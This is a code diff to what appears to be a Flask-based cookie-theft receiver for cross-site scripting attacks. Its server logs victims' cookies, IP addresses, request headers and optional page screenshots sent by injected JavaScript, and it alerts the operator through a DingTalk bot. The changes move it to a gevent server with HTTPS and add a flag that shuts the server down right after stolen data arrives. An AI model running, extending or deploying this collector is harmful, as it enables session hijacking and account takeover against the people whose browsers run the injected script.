@@ -9,16 +9,19 @@ import time
 import json
 import base64
 import argparse
+from gevent import pywsgi, monkey
+monkey.patch_all()
 from flask import *
 from flask_cors import CORS
 from PIL import Image, UnidentifiedImageError
 
-from config import pem, key, generate_js
+from config import crt, key, generate_js
 from dingtalk_bot import bot
 
 
 async def custom_js(data, ip: str, header: str, host):
     global ding
+    global clear
 
     get_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
 
@@ -45,10 +48,20 @@ async def custom_js(data, ip: str, header: str, host):
             f.write(
                 get_time + '\n' + 'HOST：' + host + '\nip：' + ip + '\n' + 'data：' + data + '\n\n' + 'Headers：\n' + header + '\n')
 
+    if clear:
+        if not ding:
+            print(">>>服务端关闭成功")
+            exit()
+        else:
+            bot("服务端已关闭")
+            print(">>>服务端关闭成功")
+            exit()
+
 
 async def save_data(data: dict, ip: str, header: str):
     global ding
     global screen
+    global clear
 
     try:
         if not screen:
@@ -96,6 +109,15 @@ async def save_data(data: dict, ip: str, header: str):
             f.write(get_time + '\n' + 'HOST：' + data['host'] + '\nip：' + ip + '\nCookie: ' + data[
                 'cookie'] + screenshot_state + '\n\n' + 'Headers：\n' + header + '\n')
 
+    if clear:
+        if not ding:
+            print(">>>服务端关闭成功")
+            exit()
+        else:
+            bot("服务端已关闭")
+            print(">>>服务端关闭成功")
+            exit()
+
 
 app = Flask(__name__)
 CORS(app, resources=r'/*')
@@ -113,11 +135,6 @@ async def get_cookie():
     return "success"
 
 
-# @app.route('/')
-# def index():
-#     return render_template('index.html')
-
-
 if __name__ == "__main__":
     print(r""" _____   _           ___   _____   _   _   
 /  ___| | |         /   | |  _  \ | | / /  
@@ -127,15 +144,17 @@ if __name__ == "__main__":
 \_____| |_____| /_/   |_| |_____/ |_|  \_\ """)
 
     arg = argparse.ArgumentParser()
-    arg.add_argument('-s', '--ssl', action="store_true", help="启用https，可选项")
+    arg.add_argument('-ssl', action="store_true", help="启用https，可选项")
     arg.add_argument('-d', '--ding', action="store_true", help="启用钉钉机器人，可选项")
-    arg.add_argument('--js', action="store_true", help="配置自定义JS，可选项")
+    arg.add_argument('-js', action="store_true", help="配置自定义JS，可选项")
     arg.add_argument('--screen', action="store_true", help="启用页面截图，可选项")
+    arg.add_argument('--clear', action="store_true",help="启用接受到数据后立即关闭服务端，可选项")
     arg = arg.parse_args()
 
     ding = arg.ding
     screen = arg.screen
     js = arg.js
+    clear = arg.clear
 
     if arg.screen and arg.js:
         raise ValueError("不支持自定义JS再指定--screen进行页面截图")
@@ -143,7 +162,13 @@ if __name__ == "__main__":
     generate_js(screen) if screen else generate_js()
 
     if arg.ssl:
-        ssl = (pem, key)
-        app.run("0.0.0.0", port=5000, ssl_context=ssl)
+        # ssl = (crt, key)
+        server = pywsgi.WSGIServer(('0.0.0.0', 5000), app, keyfile=key, certfile=crt)
+        print(">>>服务端开启成功")
+        server.serve_forever()
+        # app.run("0.0.0.0", port=5000, ssl_context=ssl)
     else:
-        app.run("0.0.0.0", port=5000)
+        server = pywsgi.WSGIServer(('0.0.0.0', 5000), app)
+        print(">>>服务端开启成功")
+        server.serve_forever()
+        # app.run("0.0.0.0", port=5000)
